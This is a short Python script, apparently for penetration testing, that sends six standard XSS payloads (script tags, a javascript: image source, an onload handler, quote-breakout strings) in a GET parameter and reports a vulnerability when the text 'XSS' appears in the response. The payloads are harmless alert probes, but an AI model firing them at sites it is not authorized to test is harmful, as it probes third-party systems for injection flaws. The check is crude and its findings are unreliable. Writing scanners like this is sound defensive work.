import requests


# Function to check for XSS vulnerability
def check_xss(url):
    xss_commands = [
        "<script>alert('XSS')</script>",
        "<img src=\"javascript:alert('XSS')\">",
        "<body onload=alert('XSS')>",
        "\"> <script>alert('XSS')</script>",
        "';!--\"<XSS>=&{()}",
        "\";alert('XSS');//"
    ]
    logMass = []

    for command in xss_commands:
        print("pentest начат для команды" + command)
        # Отправляем запрос GET на сайт с параметром, содержащим команду XSS
        response = requests.get(url + "?param=" + command)
        # Если на странице есть небезопасный вывод, выводим сообщение об ошибке
        if "XSS" in response.text:
            logMass.append({"start": "pentest начат для команды" + command,
                            "text": "Уязвимость найдена: " + command})
        else:
            logMass.append({"start": "pentest начат для команды" + command,
                            "text": "Петест проиден успешно уязвимрстей нет.............." + command})
    return logMass
